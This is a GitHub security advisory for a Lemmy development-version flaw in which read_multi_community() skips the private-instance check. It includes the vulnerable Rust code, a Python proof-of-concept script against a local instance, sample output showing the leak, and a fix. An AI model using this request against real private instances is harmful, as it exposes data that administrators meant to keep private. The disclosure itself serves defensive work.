# [M] Private Lemmy instances expose multi-community metadata without authentication

## Summary
Severity: Medium
Advisory: GHSA-jmxc-hhwx-gvv3
CWE: CWE-862
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-jmxc-hhwx-gvv3
Type: github-advisory

## Affected
- crates.io: `lemmy_api` — affected >=0

## Details
**NOTE**: Only affects development version.

## Summary

`read_multi_community()` does not enforce the private-instance setting. On a private instance, an unauthenticated visitor can read multi-community names, titles, summaries, sidebars, owner identities, and member community lists.

## Details

Other read handlers load `local_site` and call `check_private_instance()` before returning data to unauthenticated callers. `read_multi_community()` does not call that helper:

```rust
pub async fn read_multi_community(
  Query(data): Query<GetMultiCommunity>,
  context: Data<LemmyContext>,
  local_user_view: Option<LocalUserView>,
) -> LemmyResult<Json<GetMultiCommunityResponse>> {
  let my_person_id = local_user_view.as_ref().map(|l| l.person.id);
  let id = resolve_multi_community_identifier(&data.name, data.id, &context, &local_user_view)
    .await?
    .ok_or(LemmyErrorType::NoIdGiven)?;
  let multi_community_view =
    MultiCommunityView::read(&mut context.pool(), id, my_person_id).await?;
```

`get_community()`, `list_posts()`, `list_comments()`, `read_person()`, `search()`, and `resolve_object()` all enforce the private-instance guard.

## Proof of Concept

The script creates a multi-community whose metadata contains a marker, turns on `private_instance`, confirms a guarded control endpoint blocks unauthenticated callers, then reads the same multi-community over `GET /multi_community` without authentication.

```python
#!/usr/bin/env python3
import json, random, string
import requests

BASE       = "http://127.0.0.1:8536/api/v4"
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"

def api(method, path, token=None, **kw):
    h = kw.pop("headers", {})
    if token: h["Authorization"] = "Bearer " + token
    return requests.request(method, BASE + path, headers=h, **kw)

suffix = "multi" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
secret = "SECRET_MULTI_" + suffix

admin = api("POST", "/account/auth/login", json={"username_or_email": ADMIN_USER, "password": ADMIN_PASS}).json()["jwt"]

# Create a multi-community whose title/summary/sidebar embed the marker.
mid = api("POST", "/multi_community", admin, json={
    "name": "m" + suffix, "title": secret,
    "summary": secret + " summary", "sidebar": secret + " sidebar",
}).json()["multi_community_view"]["multi"]["id"]

# Enable private_instance.
api("PUT", "/site", admin, json={"private_instance": True})

print("private_instance:", api("GET", "/site").json()["site_view"]["local_site"]["private_instance"])

# Control: a comparable read endpoint correctly rejects unauthenticated callers.
control = api("GET", "/community/list")
print("unauth /community/list (control):", control.status_code, control.text[:120])

# Leak: read_multi_community returns the private metadata to an unauthenticated caller.
leak = api("GET", "/multi_community", params={"id": mid})
print("unauth /multi_community:", leak.status_code, leak.text[:300])
print("contains secret:", secret in leak.text)
```

Output:

```text
private_instance: True
unauth /community/list (control): 400 {"error":"instance_is_private","cause":"InstanceIsPrivate"}
unauth /multi_community: 200 {"multi_community_view":{"multi":{"title":"SECRET_MULTI_multijwxokm","summary":"SECRET_MULTI_multijwxokm summary","sidebar":"SECRET_MULTI_multijwxokm sidebar"}}}
contains secret: True
```

The control request shows the privacy setting is active. The multi-community endpoint still returns the private metadata.

## Impact

An unauthenticated visitor can read multi-community metadata from an instance whose admin configured the site as private. The exposed fields include names, titles, summaries, sidebars, owner identities, and member community lists.

## Recommended Fix

Load `local_site` at the start of `read_multi_community()` and call `check_private_instance(&local_user_view, &local_site)?` before resolving or reading the multi-community.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jmxc-hhwx-gvv3
- https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d
- https://github.com/LemmyNet/lemmy
